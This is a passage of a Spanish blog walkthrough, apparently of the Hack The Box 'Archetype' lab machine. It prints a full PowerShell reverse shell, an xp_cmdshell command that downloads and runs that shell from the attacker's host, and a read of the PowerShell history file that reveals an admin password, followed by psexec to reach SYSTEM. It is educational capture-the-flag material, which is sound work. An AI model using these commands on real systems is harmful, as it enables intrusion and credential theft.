configuración del servidor <code>SQL</code> para habilitar una conexión&nbsp;remota.</p>
<p>Para esto podemos utilizar <a href="https://docs.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/sp-configure-transact-sql?view=sql-server-ver15">sp_configure</a>
el cual nos permite modificar configuraciones globales del&nbsp;servidor.</p>
<p>Su sintaxis es la&nbsp;siguiente:</p>
<div class="highlight"><pre><span></span><code><span class="n">sp_configure</span> <span class="p">[</span> <span class="o">@</span><span class="n">configname</span><span class="o">=</span> <span class="p">]</span> <span class="s1">&#39;hadoop connectivity&#39;</span><span class="p">,</span>
             <span class="p">[</span> <span class="o">@</span><span class="n">configvalue</span> <span class="o">=</span> <span class="p">]</span> <span class="mi">0</span> <span class="o">|</span> <span class="mi">1</span> <span class="o">|</span> <span class="mi">2</span> <span class="o">|</span> <span class="mi">3</span> <span class="o">|</span> <span class="mi">4</span> <span class="o">|</span> <span class="mi">5</span> <span class="o">|</span> <span class="mi">6</span> <span class="o">|</span> <span class="mi">7</span>
</code></pre></div>


<p>Como podemos ver toma dos parámetros, el nombre de la configuración y su valor.
El valor depende directamente de la configuración que estamos modificando. Una
vez que hemos cambiado alguna configuración es necesario utilizar <code>reconfigure;</code>
para que se apliquen los&nbsp;cambios.</p>
<p>Si ejecutamos <code>sp_configure;</code> podemos ver una lista de configuraciones
disponibles, sin embargo estamos buscando una que nos permita habilitar una
conexión remota. Para esto habilitaremos que se muestren las opciones&nbsp;avanzadas.</p>
<div class="highlight"><pre><span></span><code><span class="k">SQL</span><span class="o">&gt;</span> <span class="k">EXEC</span> <span class="n">sp_configure</span> <span class="s1">&#39;Show Advanced Options&#39;</span><span class="p">,</span> <span class="mi">1</span><span class="p">;</span>
<span class="k">SQL</span><span class="o">&gt;</span> <span class="n">reconfigure</span><span class="p">;</span>
</code></pre></div>


<p>Al habilitar que nos muestre las opciones avanzadas podremos ver que hay una
configuración llamada <a href="https://docs.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-sql?view=sql-server-ver15">xp_cmdshell</a>
la cual nos permite invocar una terminal de comandos de Windows y enviarle una
cadena a&nbsp;ejecutar.</p>
<div class="highlight"><pre><span></span><code><span class="k">EXEC</span> <span class="n">sp_configure</span> <span class="s1">&#39;xp_cmdshell&#39;</span><span class="p">,</span> <span class="mi">1</span><span class="p">;</span>
<span class="n">reconfigure</span><span class="p">;</span>
</code></pre></div>


<p>Ya habilitamos la configuración para utilizar <code>xp_cmdshell</code>, podemos verificar
los permisos o alcance de nuestra cuenta dentro de <code>Windows</code> utilizando el
comando <code>whoami</code>.</p>
<div class="highlight"><pre><span></span><code><span class="n">xp_cmdshell</span> <span class="ss">&quot;whoami&quot;</span>
</code></pre></div>


<p>Su salida&nbsp;es:</p>
<div class="highlight"><pre><span></span><code><span class="k">output</span>                                                                             

<span class="c1">--------------------------------------------------------------------------------   </span>

<span class="n">archetype</span><span class="err">\</span><span class="n">sql_svc</span>                                                                  

<span class="k">NULL</span>                                                                               
</code></pre></div>


<p>Podemos observar que se nos vuelve a desplegar el usuario <code>archetype\sql_svc</code>,
esto significa que <code>SQL Server</code> esta corriendo con ese usuario dentro de
<code>Ẁindows</code>, y podemos ver un <code>NULL</code> lo cual significa que no tiene permisos de&nbsp;administrador.</p>
<p>Necesitamos una mejor terminal. Intentemos crear una reverse shell mediante
<code>PowerShell</code>. Para esto podemos utilizar el siguiente&nbsp;código:</p>
<div class="highlight"><pre><span></span><code><span class="nv">$client</span> <span class="o">=</span> New-Object System.Net.Sockets.TCPClient<span class="o">(</span><span class="s2">&quot;10.10.14.3&quot;</span>,443<span class="o">)</span><span class="p">;</span><span class="nv">$stream</span> <span class="o">=</span> <span class="nv">$client</span>.GetStream<span class="o">()</span><span class="p">;</span><span class="o">[</span>byte<span class="o">[]]</span><span class="nv">$bytes</span> <span class="o">=</span> <span class="m">0</span>..65535<span class="p">|</span>%<span class="o">{</span><span class="m">0</span><span class="o">}</span><span class="p">;</span><span class="k">while</span><span class="o">((</span><span class="nv">$i</span> <span class="o">=</span> <span class="nv">$stream</span>.Read<span class="o">(</span><span class="nv">$bytes</span>, <span class="m">0</span>, <span class="nv">$bytes</span>.Length<span class="o">))</span> -ne <span class="m">0</span><span class="o">){</span><span class="p">;</span><span class="nv">$data</span> <span class="o">=</span> <span class="o">(</span>New-Object -TypeName System.Text.ASCIIEncoding<span class="o">)</span>.GetString<span class="o">(</span><span class="nv">$bytes</span>,0, <span class="nv">$i</span><span class="o">)</span><span class="p">;</span><span class="nv">$sendback</span> <span class="o">=</span> <span class="o">(</span>iex <span class="nv">$data</span> <span class="m">2</span>&gt;<span class="p">&amp;</span><span class="m">1</span> <span class="p">|</span> Out-String <span class="o">)</span><span class="p">;</span><span class="nv">$sendback2</span> <span class="o">=</span> <span class="nv">$sendback</span> + <span class="s2">&quot;# &quot;</span><span class="p">;</span><span class="nv">$sendbyte</span> <span class="o">=</span> <span class="o">([</span>text.encoding<span class="o">]</span>::ASCII<span class="o">)</span>.GetBytes<span class="o">(</span><span class="nv">$sendback2</span><span class="o">)</span><span class="p">;</span><span class="nv">$stream</span>.Write<span class="o">(</span><span class="nv">$sendbyte</span>,0,<span class="nv">$sendbyte</span>.Length<span class="o">)</span><span class="p">;</span><span class="nv">$stream</span>.Flush<span class="o">()}</span><span class="p">;</span><span class="nv">$client</span>.Close<span class="o">()</span>
</code></pre></div>


<p>La linea anterior es necesario guardarla en un archivo en tu equipo, vamos a
llamar al archivo <code>shell.ps1</code>.</p>
<p>Ahora que lo hemos guardado en un archivo, solo por no dejar, vamos a expandir
la linea anterior, simplemente queremos que se vea un poco mejor lo que&nbsp;hace.</p>
<div class="highlight"><pre><span></span><code><span class="nv">$client</span> <span class="o">=</span> New-Object System.Net.Sockets.TCPClient<span class="o">(</span><span class="s2">&quot;10.10.14.3&quot;</span>,443<span class="o">)</span><span class="p">;</span>
<span class="nv">$stream</span> <span class="o">=</span> <span class="nv">$client</span>.GetStream<span class="o">()</span><span class="p">;</span>
<span class="o">[</span>byte<span class="o">[]]</span><span class="nv">$bytes</span> <span class="o">=</span> <span class="m">0</span>..65535<span class="p">|</span>%<span class="o">{</span><span class="m">0</span><span class="o">}</span><span class="p">;</span>
<span class="k">while</span><span class="o">((</span><span class="nv">$i</span> <span class="o">=</span> <span class="nv">$stream</span>.Read<span class="o">(</span><span class="nv">$bytes</span>, <span class="m">0</span>, <span class="nv">$bytes</span>.Length<span class="o">))</span> -ne <span class="m">0</span><span class="o">){</span><span class="p">;</span>
    <span class="nv">$data</span> <span class="o">=</span> <span class="o">(</span>New-Object -TypeName System.Text.ASCIIEncoding<span class="o">)</span>.GetString<span class="o">(</span><span class="nv">$bytes</span>,0, <span class="nv">$i</span><span class="o">)</span><span class="p">;</span>
    <span class="nv">$sendback</span> <span class="o">=</span> <span class="o">(</span>iex <span class="nv">$data</span> <span class="m">2</span>&gt;<span class="p">&amp;</span><span class="m">1</span> <span class="p">|</span> Out-String <span class="o">)</span><span class="p">;</span>
    <span class="nv">$sendback2</span> <span class="o">=</span> <span class="nv">$sendback</span> + <span class="s2">&quot;# &quot;</span><span class="p">;</span>
    <span class="nv">$sendbyte</span> <span class="o">=</span> <span class="o">([</span>text.encoding<span class="o">]</span>::ASCII<span class="o">)</span>.GetBytes<span class="o">(</span><span class="nv">$sendback2</span><span class="o">)</span><span class="p">;</span>
    <span class="nv">$stream</span>.Write<span class="o">(</span><span class="nv">$sendbyte</span>,0,<span class="nv">$sendbyte</span>.Length<span class="o">)</span><span class="p">;</span>
    <span class="nv">$stream</span>.Flush<span class="o">()}</span><span class="p">;</span>
<span class="nv">$client</span>.Close<span class="o">()</span>
</code></pre></div>


<p>Si observamos, estamos viendo que se crea una conexión a la <span class="caps">IP</span> y el puerto
especificado, se crea un stream de datos y a partir de aquí se codifica la
información para poder enviarla a través de la conexión a una terminal&nbsp;remota.</p>
<p>Recuerden cambiar la dirección <span class="caps">IP</span> al de su equipo. Si no conoces tu dirección
puedes utilizar el siguiente&nbsp;comando:</p>
<div class="highlight"><pre><span></span><code>ip addr
</code></pre></div>


<p>Con la <span class="caps">IP</span> indicada y el archivo creado, desde la terminal nos dirigimos a la
carpeta donde guardaste el archivo. Necesitamos enviar el archivo que esta en
nuestro equipo al servidor <code>SQL</code> donde nos conectamos para poder ejecutarlo ahí
y crear la reverse&nbsp;shell.</p>
<p>Para esto, vamos a hacer los siguientes&nbsp;pasos:</p>
<ul>
<li>Levantaremos un servidor <code>HTTP</code> del cual descargaremos el&nbsp;archivo</li>
<li>Configuramos los puertos de escucha para nuestra conexión de la reverse&nbsp;shell</li>
<li>Configuraremos el firewall para aceptar las dos conexiones&nbsp;anteriores</li>
</ul>
<p>El primer punto lo haremos utilizando el interprete de <code>python</code>, con el cual
podemos utilizar la clase <code>http.server</code> e indicarle el puerto de escucha.
Recuerda que necesitar estar en la carpeta donde guardaste el archivo <code>shell.ps1</code>.</p>
<div class="highlight"><pre><span></span><code>python3 -m http.server <span class="m">80</span>
</code></pre></div>


<p>El segundo punto lo podemos hacer utilizando <a href="https://en.wikipedia.org/wiki/Netcat">netcat</a>
la cual es una herramienta para leer o escribir conexiones de red sobre <span class="caps">TCP</span> o <span class="caps">UDP</span>.</p>
<p>El comando a utilizar&nbsp;es:</p>
<div class="highlight"><pre><span></span><code>nc -lvnp <span class="m">443</span>
</code></pre></div>


<p>Los parámetros de <code>netcat</code> son los&nbsp;siguientes:</p>
<ul>
<li><code>l</code>: modo de escucha, para conexiones&nbsp;entrantes</li>
<li><code>v</code>: modo <code>verbose</code>, para ir viendo que&nbsp;sucede</li>
<li><code>n</code>: para trabajar con direcciones <span class="caps">IP</span></li>
<li><code>p</code>: para indicar el puerto donde estará escuchando la conexión, que es el&nbsp;443</li>
</ul>
<p>Para el tercer punto utilizaremos <a href="https://wiki.debian.org/Uncomplicated%20Firewall%20%28ufw%29">ufw</a>
el cual es un firewall con el que vamos a gestionar los&nbsp;puertos.</p>
<p>El comando a utilizar&nbsp;es:</p>
<div class="highlight"><pre><span></span><code>ufw allow from <span class="m">10</span>.10.10.27 proto tcp to any port <span class="m">80</span>,443
</code></pre></div>


<p>Con sus comando estamos indicando que permita (<code>allow</code>) conexiones desde (<code>from</code>)
la dirección <span class="caps">IP</span> <code>10.10.10.27</code> que es la que estamos atacando mediante el protocolo
<code>TCP</code> (<code>proto tcp</code>) a los puertos 80 y 443 (<code>to any port 80,443</code>).</p>
<p>Ahora, regresemos a nuestra terminal de <code>SQL</code>, ahi vamos a utilizar la herramienta
<code>xp_cmdshell</code> que utilizamos previamente, ahora invocaremos una conexión a nuestro
servidor <code>HTTP</code> local que nos permita descargar la reverse shell y ejecutarla.
Al ejecutar la reverse shell se creara una conexión a nuestro equipo que sera
aceptada por <code>netcat</code> y desde ahi ya podremos utilizar la reverse&nbsp;shell.</p>
<p>El comando a utilizar&nbsp;es:</p>
<div class="highlight"><pre><span></span><code>xp_cmdshell <span class="s2">&quot;powershell &quot;</span>IEX <span class="o">(</span>New-Object Net.WebClient<span class="o">)</span>.DownloadString<span class="o">(</span><span class="se">\&quot;</span>http://10.10.14.3/shell.ps1<span class="se">\&quot;</span><span class="o">)</span><span class="p">;</span><span class="s2">&quot;</span>
</code></pre></div>


<p>Recuerda actualizar tu dirección <span class="caps">IP</span> en el comando&nbsp;anterior.</p>
<p>Ya tenemos una reverse shell al usuario en <code>Windows</code>, podemos proceder a extraer
la bandera de su escritorio. Para esto podemos podemos movernos a su escritorio
con el comando <code>cd</code> e indicar la&nbsp;ruta.</p>
<div class="highlight"><pre><span></span><code><span class="err">cd C:\Users\sql_svc\Desktop</span>
</code></pre></div>


<p>Aquí podemos ver que se encuentra el archivo <code>user.txt</code> el cual contiene la&nbsp;bandera.</p>
<div class="highlight"><pre><span></span><code><span class="o">#</span> <span class="n">dir</span>


    <span class="n">Directory</span><span class="p">:</span> <span class="k">C</span><span class="p">:</span><span class="err">\</span><span class="n">Users</span><span class="err">\</span><span class="n">sql_svc</span><span class="err">\</span><span class="n">Desktop</span>


<span class="k">Mode</span>                <span class="n">LastWriteTime</span>         <span class="k">Length</span> <span class="n">Name</span>                                                                  
<span class="c1">----                -------------         ------ ----                                                                  </span>
<span class="o">-</span><span class="n">ar</span><span class="c1">---        2/25/2020   6:37 AM             32 user.txt                                                              </span>
</code></pre></div>


<p>Le podemos aplicar un <code>type</code> o un <code>cat</code> al archivo y listo! Tenemos la primer&nbsp;bandera.</p>
<h2>Privilege&nbsp;Escalation</h2>
<p>Ya obtuvimos la bandera a nivel de usuario, ahora necesitamos obtener la bandera
a nivel&nbsp;administrador.</p>
<p>Sabemos que la cuenta en la que nos encontramos no tiene permisos de administrador
pero que se utiliza como una cuenta para gestionar servicios, esto significa
que en algún momento cuando se levantan los servicios se aplica algún permiso
de administrador. Para conocer en que momento sucede podemos revisar el historial
de comandos de <code>PowerShell</code>. Para esto podemos utilizar el siguiente&nbsp;comando:</p>
<div class="highlight"><pre><span></span><code><span class="nb">type</span> C:<span class="se">\U</span>sers<span class="se">\s</span>ql_svc<span class="se">\A</span>ppData<span class="se">\R</span>oaming<span class="se">\M</span>icrosoft<span class="se">\W</span>indows<span class="se">\P</span>owerShell<span class="se">\P</span>SReadline<span class="se">\C</span>onsoleHost_history.txt
</code></pre></div>


<p>La salida del comando anterior nos muestra lo&nbsp;siguiente:</p>
<div class="highlight"><pre><span></span><code>net.exe use T: <span class="se">\\</span>Archetype<span class="se">\b</span>ackups /user:administrator MEGACORP_4dm1n!!
</code></pre></div>


<p>Con lo anterior podemos observar que el disco <code>backups</code> que encontramos al
conectarnos por <code>SMB</code> fue mapeado con una cuenta local de administrador, y
ahora tenemos su&nbsp;contraseña.</p>
<p>Para conectarnos utlizaremos una versión de <a href="https://docs.microsoft.com/en-us/sysinternals/downloads/psexec">PsExec</a> incluida en <code>impacket</code>.</p>
<p>De igual manera que el comando de <code>mssqlclient</code> lo invocaremos a traves del
interprete de <code>Python</code>.</p>
<div class="highlight"><pre><span></span><code>python3 psexec.py administrator@10.10.10.27
</code></pre></div>


<p>Se nos pedirá la contraseña, y después de ingresarla veremos que la conexión
es satisfactoria, de tal modo que tenemos una terminal con permisos de&nbsp;administrador.</p>
<div class="highlight"><pre><span></span><code>Impacket v0.9.21 - Copyright <span class="m">2020</span> SecureAuth Corporation

Password:
<span class="o">[</span>*<span class="o">]</span> Requesting shares on <span class="m">10</span>.10.10.27.....
<span class="o">[</span>*<span class="o">]</span> Found writable share ADMIN$
<span class="o">[</span>*<span class="o">]</span> Uploading file jcWXyjRG.exe
<span class="o">[</span>*<span class="o">]</span> Opening SVCManager on <span class="m">10</span>.10.10.27.....
<span class="o">[</span>*<span class="o">]</span> Creating service UFMW on <span class="m">10</span>.10.10.27.....
<span class="o">[</span>*<span class="o">]</span> Starting service UFMW.....
<span class="o">[</span>!<span class="o">]</span> Press <span class="nb">help</span> <span class="k">for</span> extra shell commands
Microsoft Windows <span class="o">[</span>Version <span class="m">10</span>.0.17763.107<span class="o">]</span>
<span class="o">(</span>c<span class="o">)</span> <span class="m">2018</span> Microsoft Corporation. All rights reserved.

C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt;
</code></pre></div>


<p>Verificamos nuestros&nbsp;permisos:</p>
<div class="highlight"><pre><span></span><code>C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt;whoami
nt authority<span class="se">\s</span>ystem
</code></pre></div>


<p>En efecto, tenemso permisos de administrador, y ahora podemos ir al escritorio
del administrador y extraer la última&nbsp;bandera.</p>
<div class="highlight"><pre><span></span><code>C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt;cd C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>esktop
</code></pre></div>


<div class="highlight"><pre><span></span><code>C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>esktop&gt;dir
 Volume in drive C has no label.
 Volume Serial Number is CE13-2325

 Directory of C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>esktop

<span class="m">01</span>/20/2020  <span class="m">05</span>:42 AM    &lt;DIR&gt;          .
<span class="m">01</span>/20/2020  <span class="m">05</span>:42 AM    &lt;DIR&gt;          ..
<span class="m">02</span>/25/2020  <span class="m">06</span>:36 AM                <span class="m">32</span> root.txt
               <span class="m">1</span> File<span class="o">(</span>s<span class="o">)</span>             <span class="m">32</span> bytes
               <span class="m">2</span> Dir<span class="o">(</span>s<span class="o">)</span>  <span class="m">33</span>,818,599,424 bytes free
</code></pre></div>


<div class="highlight"><pre><span></span><code>C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>esktop&gt;type root.txt
</code></pre></div>


<p>Listo! Tenemos las dos banderas de esta&nbsp;máquina!</p>
<h2>Fin</h2>
<p>Bueno, con eso hemos concluido la revisión del primer walk-through de las
máquinas de introducción de <code>HTB</code>. Este texto fue un poco más extenso ya que se
fueron expllicando paso a paso cada comando, pero conforme avancemos en las
herramientas y comandos obviaremos los que se hayan explicado&nbsp;previamente.</p>
<p>Espero haya sido de tu agrado y utilidad este texto, y si vas comenzando en
estos temas de seguridad, <a href="https://www.youtube.com/watch?v=dQw4w9WgXcQ">recuerda no rendirte</a>
y seguir aprendiendo poco a&nbsp;poco.</p>
<p>Nos vemos en el siguiente texto.&nbsp;Ciao!</p>
<p><code>#HappyHacking</code></p>


             
 
            
            
            






            <hr/>
        </div>
        <section id="article-sidebar" class="span2">
            <h4>Published</h4>
            <time itemprop="dateCreated" datetime="2020-08-07T00:00:00-05:00">ago 7, 2020</time>
<h4>Last Updated</h4>
<time datetime="2021-04-04T00:00:00-06:00">abr 4, 2021</time>

            <h4>Category</h4>
            <a class="category-link" href="https://penserbjorne.com/categories.html#htb-ref">htb</a>
            <h4>Tags</h4>
            <ul class="list-of-tags tags-in-article">
                <li><a href="https://penserbjorne.com/tags.html#cybersecurity-ref">cybersecurity
                    <span>2</span>
</a></li>
                <li><a href="https://penserbjorne.com/tags.html#htb-ref">htb
                    <span>2</span>
</a></li>
                <li><a href="https://penserbjorne.com/tags.html#pentest-ref">pentest
                    <span>2</span>
</a></li>
                <li><a href="https://penserbjorne.com/tags.html#writeup-ref">writeup
                    <span>2</span>
</a></li>
            </ul>
<h4>Contact</h4>
<div id="sidebar-social-link">
    <a href="https://twitter.com/_penserbjorne" title="" target="_blank" rel="nofollow noopener noreferrer">
        <svg xmlns="http://www.w3.org/2000/svg" aria-label="Twitter" role="img" viewBox="0 0 512 512"><rect width="512" height="512" rx="15%" fill="#1da1f3"/><path fill="#fff" d="M437 152a72 72 0 0 1-40 12 72 72 0 0 0 32-40 72 72 0 0 1-45 17 72 72 0 0 0-122 65 200 200 0 0 1-145-74 72 72 0 0 0 22 94 72 72 0 0 1-32-7 72 72 0 0 0 56 69 72 72 0 0 1-32 1 72 72 0 0 0 67 50 200 200 0 0 1-105 29 200 200 0 0 0 309-179 200 200 0 0 0 35-37"/></svg>
    </a>
    <a href="https://github.com/penserbjorne/" title="" target="_blank" rel="nofollow noopener noreferrer">
        <svg xmlns="http://www.w3.org/2000/svg" aria-label="GitHub" role="img" viewBox="0 0 512 512"><rect width="512" height="512" rx="15%" fill="#1B1817"/><path fill="#fff" d="M335 499c14 0 12 17 12 17H165s-2-17 12-17c13 0 16-6 16-12l-1-50c-71 16-86-28-86-28-12-30-28-37-28-37-24-16 1-16 1-16 26 2 40 26 40 26 22 39 59 28 74 22 2-17 9-28 16-35-57-6-116-28-116-126 0-28 10-51 26-69-3-6-11-32 3-67 0 0 21-7 70 26 42-12 86-12 128 0 49-33 70-26 70-26 14 35 6 61 3 67 16 18 26 41 26 69 0 98-60 120-117 126 10 8 18 24 18 48l-1 70c0 6 3 12 16 12z"/></svg>
    </a>
</div>
            





            





        </section>
</div>
</article>
                    </div>
                    <div class="span1"></div>
                </div>
            </div>
        </div>
<footer>

    <div>
        <span class="site-name">Blog de Penserbjorne</span> - No soy nadie. No soy nada.
    </div>



    <div id="fpowered">
        Powered by: <a href="http://getpelican.com/" title="Pelican Home Page" target="_blank" rel="nofollow noopener noreferrer">Pelican</a>
        Theme: <a href="https://elegant.oncrashreboot.com/" title="Theme Elegant Home Page" target="_blank" rel="nofollow noopener noreferrer">Elegant</a>
    </div>
</footer>            <script src="//code.jquery.com/jquery.min.js"></script>
        <script src="//netdna.bootstrapcdn.com/twitter-bootstrap/2.3.2/js/bootstrap.min.js"></script>
        <script>
            function validateForm(query)
            {
                return (query.length > 0);
            }
        </script>

    <script>
    (function () {
        if (window.location.hash.match(/^#comment-\d+$/)) {
            $('#comment_thread').collapse('show');
        }
    })();
    window.onhashchange=function(){
        if (window.location.hash.match(/^#comment-\d+$/))
            window.location.reload(true);
    }
    $('#comment_thread').on('shown', function () {
        var link = document.getElementById('comment-accordion-toggle');
        var old_innerHTML = link.innerHTML;
        $(link).fadeOut(200, function() {
            $(this).text('Click here to hide comments').fadeIn(200);
        });
        $('#comment_thread').on('hidden', function () {
            $(link).fadeOut(200, function() {
                $(this).text(old_innerHTML).fadeIn(200);
            });
        })
    })
</script>

    </body>
    <!-- Theme: Elegant built for Pelican
        License : MIT -->
</html>